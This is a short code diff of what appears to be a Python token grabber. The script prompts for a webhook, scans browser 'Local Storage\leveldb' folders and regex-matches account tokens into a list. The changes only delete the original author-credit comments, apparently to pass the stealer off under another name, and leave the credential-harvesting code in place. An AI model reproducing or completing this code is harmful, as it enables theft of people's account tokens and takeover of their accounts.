@@ -3,7 +3,7 @@ import re
 import json
 import requests
 userwh = input("Enter your webhook")
-#made by dev7knight
+
 def gettokens(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
@@ -15,7 +15,7 @@ def gettokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
-#made by dev7knight
+
 def main():
     checked = []
     already_cached_tokens = []
@@ -57,4 +57,3 @@ try:
 except:
     pass
 
-#made by dev7knight
